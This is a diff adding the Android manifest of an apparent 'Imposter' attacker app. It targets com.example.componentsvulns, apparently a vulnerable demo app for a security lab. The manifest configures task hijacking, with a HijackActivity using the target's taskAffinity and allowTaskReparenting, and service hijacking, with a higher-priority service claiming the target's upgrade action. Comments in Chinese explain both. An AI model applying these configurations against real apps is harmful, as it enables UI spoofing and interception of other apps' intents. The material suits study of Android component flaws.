@@ -1,0 +1,43 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
+    <application
+        android:allowBackup="false"
+        android:icon="@android:drawable/ic_dialog_alert"
+        android:label="@string/app_name"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Imposter">
+
+        <activity
+            android:name=".ImposterMainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--
+          taskAffinity 写成目标应用的包名。
+          allowTaskReparenting 允许本页在目标任务栈回到前台时移进去。
+        -->
+        <activity
+            android:name=".HijackActivity"
+            android:allowTaskReparenting="true"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:taskAffinity="com.example.componentsvulns" />
+
+        <!--
+          与目标应用 UpgradeService 使用同一个 action。
+          priority 高于目标应用，queryIntentServices 的结果里本服务排在前面。
+        -->
+        <service
+            android:name=".ImposterUpgradeService"
+            android:exported="true">
+            <intent-filter android:priority="100">
+                <action android:name="com.example.componentsvulns.action.APP_UPGRADE" />
+            </intent-filter>
+        </service>
+    </application>
+</manifest>
